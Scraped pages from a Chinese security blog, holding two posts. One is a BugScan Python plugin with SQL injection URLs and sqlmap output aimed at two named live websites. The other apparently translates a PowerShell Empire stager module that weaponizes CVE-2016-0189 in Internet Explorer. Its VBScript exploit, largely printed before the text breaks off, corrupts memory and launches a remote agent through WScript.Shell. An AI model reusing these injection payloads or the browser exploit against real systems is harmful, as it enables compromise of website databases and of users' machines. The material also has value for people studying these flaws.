  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/BugScan插件编写/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/BugScan插件编写/" itemprop="url">
                  BugScan插件编写
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:23:35+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/BugScan插件编写/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/BugScan插件编写/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/BugScan插件编写/" class="leancloud_visitors" data-flag-title="BugScan插件编写">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……</p>
<p>下面就让我们看看这个题目：</p>
<p>某通用平台被曝出有一处高危注入，以下为详情：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1</div></pre></td></tr></table></figure>
<p>userName处为一处报错注入，</p>
<p>请使用python编写一个通用脚本检测该处注入点(可使用任何python库)，<br>要求测试该脚本必须使用多个目标站点。<br>以下为两个测试站点（请勿做除测试之外的任何危险动作）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://www.jmsyzx.com/</div><div class="line">http://www.globechildren.com/</div></pre></td></tr></table></figure>
<p>哎呦，不限制python库，一个通用脚本。刚跟室友开黑了一下守望先锋（挺好玩儿的，有兴趣一起啊）的我刚看也是一脸懵逼，总之刚开始想的太多了，但其实也就是一个插件的事情（还是range一棒打醒我，所以以后还是干完正事再开黑）。</p>
<p>看了一下是mssql数据库，并且是报错注入。我们可以手工构造看数据库类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=@@version--</div></pre></td></tr></table></figure>
<p>也可以sqlmap跑一下看看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[22:07:32] [INFO] resuming back-end DBMS &apos;microsoft sql server&apos;</div><div class="line">[22:07:32] [INFO] testing connection to the target URL</div><div class="line">sqlmap resumed the following injection point(s) from stored session:</div><div class="line">---</div><div class="line">Parameter: userName (GET)</div><div class="line">Type: error-based</div><div class="line">Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; AND 2390=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (2390=2390) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(112)+CHAR(118)+CHAR(113))) AND &apos;nTAv&apos;=&apos;nTAv</div><div class="line">Type: stacked queries</div><div class="line">Title: Microsoft SQL Server/Sybase stacked queries (comment)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos;;WAITFOR DELAY &apos;0:0:5&apos;--</div><div class="line">Type: AND/OR time-based blind</div><div class="line">Title: Microsoft SQL Server/Sybase time-based blind (comment)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; WAITFOR DELAY &apos;0:0:5&apos;--</div><div class="line">---</div><div class="line">[22:07:33] [INFO] the back-end DBMS is Microsoft SQL Server</div><div class="line">web server operating system: Windows 2008 R2 or 7</div><div class="line">web application technology: ASP.NET, Microsoft IIS 7.5</div><div class="line">back-end DBMS: Microsoft SQL Server 2005</div><div class="line">[22:07:33] [INFO] fetched data logged to text files under &apos;C:\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com&apos;</div></pre></td></tr></table></figure>
<p>别多看看那个GET就行了，GET最简单了。<br>我们就抓住报错跟打印MD5这两点就行了。</p>
<p>打印MD5呢，mssql有两种方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))--</div><div class="line"></div><div class="line">2.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--</div></pre></td></tr></table></figure>
<p>直接上我写的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/evn python</span></div><div class="line"><span class="comment">#-*-:coding:utf-8 -*-</span></div><div class="line"><span class="string">"""</span></div><div class="line">POC Name : 泡妹专享</div><div class="line">Author : zeroyu</div><div class="line">mail : zeroyu.xyz@gmail.com</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></div><div class="line">	<span class="keyword">if</span> service == <span class="string">'fingerprint.girl'</span>:</div><div class="line">		<span class="keyword">return</span> <span class="keyword">True</span>, arg</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></div><div class="line">	payload = <span class="string">"/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"</span></div><div class="line">	url = arg + payload</div><div class="line">	code, head, res, errcode, _ = hackhttp.http(url)</div><div class="line">	time.sleep(<span class="number">1</span>)</div><div class="line">	<span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> <span class="string">'81dc9bdb52d04dc20036dbd8313ed055'</span> <span class="keyword">in</span> res:</div><div class="line">		security_hole(url)</div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">	<span class="keyword">from</span> dummy <span class="keyword">import</span> *</div><div class="line">	audit(assign(<span class="string">'fingerprint.girl'</span>,<span class="string">'http://www.jmsyzx.com/'</span>)[<span class="number">1</span>])</div></pre></td></tr></table></figure>
<p>是不是想问我hackhttp是个什么库，看<a href="http://doc.bugscan.net/" target="_blank" rel="external">文档</a>去。</p>
<p>好，今天妹子就泡到这儿。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" itemprop="url">
                  POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:21:47+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" class="leancloud_visitors" data-flag-title="POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    Powershell Empire 是我们在渗透目标用户时一直都很喜欢的工具之一，虽然我们通常都是用Metaspolit和Empire来一起完成工作，使浏览器漏洞和经验结合在Empire中。<br>在最近的一次测试中我们没有选择去使用MSF，相反我们和一个新的“经验丰富”的Empire一起利用CVE-2016-0189（也就是vbscrupt_godmode）其攻击使用IE9—11的用户。Empire是近6个月来我们首选的使用并且最近开始打造漏洞工具箱。如果成功，powershell将会登录并通过一个代理链接到Empire。重要的是硬盘上不会留下任何信息。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> lib.common <span class="keyword">import</span> helpers</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stager</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mainMenu, params=[])</span>:</span></div><div class="line"></div><div class="line">        self.info = &#123;</div><div class="line">            <span class="string">'Name'</span>: <span class="string">'MS16-051 IE RCE'</span>,</div><div class="line"></div><div class="line">            <span class="string">'Author'</span>: [<span class="string">'www.cgsec.co.uk'</span>],</div><div class="line"></div><div class="line">            <span class="string">'Description'</span>: (<span class="string">'Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'</span>),</div><div class="line"></div><div class="line">            <span class="string">'Comments'</span>: [</div><div class="line">                <span class="string">'Target will have to open link with vulnerable version of IE.'</span></div><div class="line">            ]</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment"># any options needed by the stager, settable during runtime</span></div><div class="line">        self.options = &#123;</div><div class="line">            <span class="comment"># format:</span></div><div class="line">            <span class="comment">#   value_name : &#123;description, required, default_value&#125;</span></div><div class="line">            <span class="string">'Listener'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Listener to generate stager for.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'StagerRetries'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Times for the stager to retry connecting.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'0'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'OutFile'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'File to output HTML to, otherwise displayed on the screen.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'Base64'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Switch. Base64 encode the powershell output.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'True'</span></div><div class="line">            &#125;,            </div><div class="line">            <span class="string">'UserAgent'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'User-agent string to use for the staging request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'Proxy'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy to use for request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'ProxyCreds'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment"># save off a copy of the mainMenu object to access external functionality</span></div><div class="line">        <span class="comment">#   like listeners/agent handlers/etc.</span></div><div class="line">        self.mainMenu = mainMenu</div><div class="line"></div><div class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</div><div class="line">            <span class="comment"># parameter format is [Name, Value]</span></div><div class="line">            option, value = param</div><div class="line">            <span class="keyword">if</span> option <span class="keyword">in</span> self.options:</div><div class="line">                self.options[option][<span class="string">'Value'</span>] = value</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></div><div class="line"></div><div class="line">        <span class="comment"># extract all of our options</span></div><div class="line">        listenerName = self.options[<span class="string">'Listener'</span>][<span class="string">'Value'</span>]</div><div class="line">        base64 = self.options[<span class="string">'Base64'</span>][<span class="string">'Value'</span>]</div><div class="line">        userAgent = self.options[<span class="string">'UserAgent'</span>][<span class="string">'Value'</span>]</div><div class="line">        proxy = self.options[<span class="string">'Proxy'</span>][<span class="string">'Value'</span>]</div><div class="line">        proxyCreds = self.options[<span class="string">'ProxyCreds'</span>][<span class="string">'Value'</span>]</div><div class="line">        stagerRetries = self.options[<span class="string">'StagerRetries'</span>][<span class="string">'Value'</span>]</div><div class="line"></div><div class="line">        encode = <span class="keyword">False</span></div><div class="line">        <span class="keyword">if</span> base64.lower() == <span class="string">"true"</span>:</div><div class="line">            encode = <span class="keyword">True</span></div><div class="line"></div><div class="line">        <span class="comment"># generate the launcher code</span></div><div class="line">        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> launcher == <span class="string">""</span>:</div><div class="line">            <span class="keyword">print</span> helpers.color(<span class="string">"[!] Error in launcher command generation."</span>)</div><div class="line">            <span class="keyword">return</span> <span class="string">""</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">			code =  <span class="string">"&lt;html&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;head&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;/head&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;body&gt;\n"</span></div><div class="line">			code += <span class="string">"    &lt;script type=\"text/vbscript\"&gt;\n"</span></div><div class="line">			code += <span class="string">"        Dim aw\n"</span></div><div class="line">			code += <span class="string">"        Dim plunge(32)\n"</span></div><div class="line">			code += <span class="string">"        Dim y(32)\n"</span></div><div class="line">			code += <span class="string">"        prefix = \"%u4141%u4141\"\n"</span></div><div class="line">			code += <span class="string">"        d = prefix &amp; \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n"</span></div><div class="line">			code += <span class="string">"        b = String(64000, \"D\")\n"</span></div><div class="line">			code += <span class="string">"        c = d &amp; b\n"</span></div><div class="line">			code += <span class="string">"        x = UnEscape(c)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Class ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"            Dim A()\n"</span></div><div class="line">			code += <span class="string">"            Private Sub Class_Initialize\n"</span></div><div class="line">			code += <span class="string">"                  ReDim Preserve A(1, 2000)\n"</span></div><div class="line">			code += <span class="string">"            End Sub\n"</span></div><div class="line">			code += <span class="string">"			\n"</span></div><div class="line">			code += <span class="string">"            Public Sub Resize()\n"</span></div><div class="line">			code += <span class="string">"                ReDim Preserve A(1, 1)\n"</span></div><div class="line">			code += <span class="string">"            End Sub\n"</span></div><div class="line">			code += <span class="string">"        End Class\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Class Dummy\n"</span></div><div class="line">			code += <span class="string">"        End Class\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function getAddr (arg1, s)\n"</span></div><div class="line">			code += <span class="string">"            aw = Null\n"</span></div><div class="line">			code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            For i = 0 To 32\n"</span></div><div class="line">			code += <span class="string">"                Set plunge(i) = s\n"</span></div><div class="line">			code += <span class="string">"            Next\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Set aw.A(arg1, 2) = s\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Dim addr\n"</span></div><div class="line">			code += <span class="string">"            Dim i\n"</span></div><div class="line">			code += <span class="string">"            For i = 0 To 31\n"</span></div><div class="line">			code += <span class="string">"                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n"</span></div><div class="line">			code += <span class="string">"                   addr = strToInt(Mid(y(i), 3 + 4, 2))\n"</span></div><div class="line">			code += <span class="string">"                End If\n"</span></div><div class="line">			code += <span class="string">"                y(i) = Null\n"</span></div><div class="line">			code += <span class="string">"            Next\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            If addr = Null Then\n"</span></div><div class="line">			code += <span class="string">"                document.location.href = document.location.href\n"</span></div><div class="line">			code += <span class="string">"                Return\n"</span></div><div class="line">			code += <span class="string">"            End If\n"</span></div><div class="line">			code += <span class="string">"            getAddr = addr\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function leakMem (arg1, addr)\n"</span></div><div class="line">			code += <span class="string">"            d = prefix &amp; \"%u0008%u4141%u4141%u4141\"\n"</span></div><div class="line">			code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></div><div class="line">			code += <span class="string">"            x = UnEscape(c)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            aw = Null\n"</span></div><div class="line">			code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Dim o\n"</span></div><div class="line">			code += <span class="string">"            o = aw.A(arg1, 2)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            leakMem = o\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Sub overwrite (arg1, addr)\n"</span></div><div class="line">			code += <span class="string">"            d = prefix &amp; \"%u400C%u0000%u0000%u0000\"\n"</span></div><div class="line">			code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></div><div class="line">			code += <span class="string">"            x = UnEscape(c)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            aw = Null\n"</span></div><div class="line">			code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            aw.A(arg1, 2) = CSng(0)\n"</span></div><div class="line">			code += <span class="string">"        End Sub\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function exploit (arg1)\n"</span></div><div class="line">			code += <span class="string">"            Dim addr\n"</span></div><div class="line">			code += <span class="string">"            Dim csession\n"</span></div><div class="line">			code += <span class="string">"            Dim olescript\n"</span></div><div class="line">			code += <span class="string">"            Dim mem\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Set dm = New Dummy\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            addr = getAddr(arg1, dm)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            mem = leakMem(arg1, addr + 8)\n"</span></div><div class="line">			code += <span class="string">"            csession = strToInt(Mid(mem, 3, 2))\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            mem = leakMem(arg1, csession + 4)\n"</span></div><div class="line">			code += <span class="string">"            olescript = strToInt(Mid(mem, 1, 2))\n"</span></div><div class="line">			code += <span class="string">"            overwrite arg1, olescript + &amp;H174\n"</span></div><div class="line">			code += <span class="string">"	    Set Object = CreateObject(\"Wscript.Shell\")\n"</span></div><div class="line">			code +=	<span class="string">"		Object.run(\""</span></div><div class="line">			code += 		launcher + 	<span class="string">"\")\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function triggerBug\n"</span></div><div class="line">			code += <span class="string">"            aw.Resize()\n"</span></div><div class="line">			code += <span class="string">"            Dim i\n"</span></div><div class="line">			code += <span class="string">"            For i = 0 To 32\n"</span></div><div class="line">			code += <span class="string">"                ' 24000x2 + 6 = 48006 bytes\n"</span></div><div class="line">			code += <span class="string">"                y(i) = Mid(x, 1, 24000)\n"</span></div><div class="line">			code += <span class="string">"            Next\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"    &lt;/script&gt;\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"    &lt;script type=\"text/javascript\"&gt;\n"</span></div><div class="line">			code += <span class="string">"        function strToInt(s)\n"</span></div><div class="line">			code 